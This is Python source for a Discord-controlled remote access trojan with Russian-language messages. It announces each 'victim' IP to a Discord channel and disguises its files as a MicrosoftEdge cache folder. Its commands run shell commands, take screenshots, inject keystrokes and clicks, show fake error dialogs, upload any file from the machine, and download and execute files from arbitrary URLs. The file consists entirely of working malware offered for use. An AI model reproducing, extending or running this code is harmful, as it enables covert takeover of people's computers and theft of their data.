import config
import discord, threading as thr, pyautogui as ag, keyboard
from subprocess import getoutput as spgeto, call as spcall
from os import getenv, path as ospath, mkdir
from requests import get
import time
from urllib.request import urlopen
messerrortitle = ""
messinfotitle = ""
messwarntitle = ""
from tkinter import messagebox
def listToString(s):
 
    # initialize an empty string
    str1 = ""
 
    # traverse in the string
    for ele in s:
        str1 += "+" + ele
    
    # return string
    return str1[1:]
def listToString2(s):
 
    # initialize an empty string
    str1 = ""
 
    # traverse in the string
    for ele in s:
        str1 += " " + ele
    
    # return string
    return str1[1:]
def listToString3(s):
 
    # initialize an empty string
    str1 = ""
 
    # traverse in the string
    for ele in s:
        str1 += ele
    
    # return string
    return str1[1:]
ip = get('https://api.ipify.org').text
if ospath.exists(getenv("ProgramFiles") + "\\MicrosoftEdge") == False:
     mkdir(getenv("ProgramFiles") + "\\MicrosoftEdge")
if ospath.exists(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache") == False:
     mkdir(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache")
from discord.ext import commands
intents = discord.Intents.default()
intents.message_content = True
client = discord.Client(intents=intents)
bot = commands.Bot(command_prefix="/", intents=discord.Intents.default())
async def control(message):
    ag.screenshot(getenv("ProgramFiles") + "\\MicrosoftEdge\\page.png")
    screen_msg = await message.channel.send("", file=discord.File(open(getenv("ProgramFiles") + "\\MicrosoftEdge\\page.png", "rb")))
    await screen_msg.add_reaction("🔁")#Reload Screenshot
    await screen_msg.add_reaction("🔄")#Restart
    await screen_msg.add_reaction("📴")#Shutdown
    @client.event
    async def on_reaction_add(reaction, user, screen_msg=screen_msg):
        if user == client.user:
            pass
        else:
            if user.guild_permissions.administrator:
                if str(reaction) == "🔁":
                    ag.screenshot(getenv("ProgramFiles") + "\\MicrosoftEdge\\page.png")
                    print("Обновление скриншота...")
                    await screen_msg.delete()
                    await control(message)
                if str(reaction) == "🔄":
                    await message.channel.send("Выполняется перезагрузка...")
                    await client.close()
                    #spcall("shutdown /r")
                if str(reaction) == "📴":
                    await message.channel.send("Выполняется выключение...")
                    await client.close()
                    #spcall("shutdown /s")
            else:
                user = await client.fetch_user(user.id)
                await user.send("Вы не являетесь администратором сервера.")
def bot():
    @client.event
    async def on_ready():
        channel = client.get_channel(config.channel_id)
        await channel.send("Жертва с внешним айпи адресом " + ip + " включила компютер!")
    @client.event
    async def on_message(message):
        if message.guild.id == config.server_id:
            if message.author.guild_permissions.administrator:
                if message.content == "^main":
                    await control(message)
                if message.content.startswith('^exec '):
                    print(message.author)
                    def execu():
                        messcmd = str(message.content).split()
                        del messcmd[0]
                        thr.Thread(target=spgeto(messcmd))
                    thr.Thread(target=execu).start()
                if message.content.startswith('^press '):
                    messkey = str(message.content).split()
                    del messkey[0]
                    print(listToString(messkey))
                    try:
                        keyboard.press_and_release(listToString(messkey))
                    except ValueError as e:
                        await message.channel.send(f"Ошибка в названии клавиши. Дополнительная информация: {str(e)}")
                if message.content.startswith('^click '):
                    messclick = str(message.content).split()
                    del messclick[0]
                    ag.click(int(messclick[0]), int(messclick[1]))
                if message.content == ('^click'):
                    ag.click()
                if message.content.startswith('^errortitle '):
                    global messerrortitle
                    messerrortitle = str(message.content).split()
                    del messerrortitle[0]
                    messerrortitle = listToString2(messerrortitle)
                if message.content.startswith('^errortext '):
                    def m():
                        messerrortext = str(message.content).split()
                        del messerrortext[0]
                        messerrortext = listToString2(messerrortext)
                        if messerrortitle == "":
                            messagebox.showerror("", messerrortext)
                        elif messerrortitle != "":
                            messagebox.showerror(messerrortitle, messerrortext)
                    thr.Thread(target=m).start()
                if message.content.startswith('^infotitle '):
                    global messinfotitle
                    messinfotitle = str(message.content).split()
                    del messinfotitle[0]
                    messinfotitle = listToString2(messinfotitle)
                if message.content.startswith('^infotext '):
                    def m():
                        messinfotext = str(message.content).split()
                        del messinfotext[0]
                        messinfotext = listToString2(messinfotext)
                        if messinfotitle == "":
                            messagebox.showinfo("", messinfotext)
                        elif messinfotitle != "":
                            messagebox.showinfo(messinfotitle, messinfotext)
                    thr.Thread(target=m).start()
                if message.content.startswith('^warntitle '):
                    global messwarntitle
                    messwarntitle = str(message.content).split()
                    del messwarntitle[0]
                    messwarntitle = listToString2(messwarntitle)
                if message.content.startswith('^warntext '):
                    def m():
                        messwarntext = str(message.content).split()
                        del messwarntext[0]
                        messwarntext = listToString2(messwarntext)
                        if messwarntitle == "":
                            messagebox.showwarning("", messwarntext)
                        elif messwarntitle != "":
                            messagebox.showwarning(messwarntitle, messwarntext)
                    thr.Thread(target=m).start()
                if message.content.startswith('^getfile '):
                    try:
                        messfilepath = str(message.content).split()
                        del messfilepath[0]
                        messfilepath = listToString2(messfilepath)
                        await message.channel.send(file=discord.File(open(messfilepath, "rb")))
                    except FileNotFoundError as f:
                        await message.channel.send(f"Ошибка: файл {messfilepath} не найден. Дополнительная информация: {f}")
                if message.content.startswith('^download_txt '):
                    chnid = message.channel.id
                    async def m():
                            messdownload = str(message.content).split()
                            del messdownload[0]
                            messdownload_ = messdownload[0]
                            messdownload = listToString3(messdownload)
                            messdownload = messdownload.split("/")
                            global pathdownloaded
                            pathdownloaded = getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1]
                            # Download from URL
                            with urlopen(messdownload_) as file:
                                content = file.read().decode()

                            # Save to file
                            with open(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1], 'w') as download:
                                download.write(content)
                    thr.Thread(target=m).start()
                if message.content.startswith('^download_txt_and_open '):
                    def m():
                        messdownload = str(message.content).split()
                        del messdownload[0]
                        messdownload_ = messdownload[0]
                        messdownload = listToString3(messdownload)
                        messdownload = messdownload.split("/")
                        global pathdownloaded
                        pathdownloaded = getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1]
                        # Download from URL
                        with urlopen(messdownload_) as file:
                            content = file.read().decode()

                        # Save to file
                        with open(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1], 'w') as download:
                            download.write(content)
                        spgeto('"' + pathdownloaded + '"')
                    thr.Thread(target=m).start()
                    await message.channel.send('Файл будет доступен по пути: "' + pathdownloaded + '" и будет запущен.')

                if message.content.startswith('^download_file '):
                    def m():
                        messdownload = str(message.content).split()
                        del messdownload[0]
                        messdownload_ = messdownload[0]
                        messdownload = listToString3(messdownload)
                        messdownload = messdownload.split("/")
                        global pathdownloaded
                        pathdownloaded = getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1]
                        # Download from URL
                        with urlopen(messdownload_) as file:
                            content = file.read()

                        # Save to file
                        with open(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1], 'wb') as download:
                            download.write(content)
                    thr.Thread(target=m).start()
                    await message.channel.send("Файл будет доступен по пути: " + pathdownloaded)
                if message.content.startswith('^download_file_and_open '):
                    def m():
                        messdownload = str(message.content).split()
                        del messdownload[0]
                        messdownload_ = messdownload[0]
                        messdownload = listToString3(messdownload)
                        messdownload = messdownload.split("/")
                        global pathdownloaded
                        pathdownloaded = getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1]
                        # Download from URL
                        with urlopen(messdownload_) as file:
                            content = file.read()

                        # Save to file
                        with open(getenv("ProgramFiles") + "\\MicrosoftEdge\\Cache\\" + messdownload[len(messdownload)-1], 'wb') as download:
                            download.write(content)
                        spgeto('"' + pathdownloaded + '"')
                    thr.Thread(target=m).start()
                    await message.channel.send('Файл будет доступен по пути: "' + pathdownloaded + '" и будет запущен.')

                    
        if message.guild.id != config.server_id:
            user = await client.fetch_user(message.author.id)
            await user.send("Ваш сервер не указан в файле config.py.")
    client.run(config.token)
bot()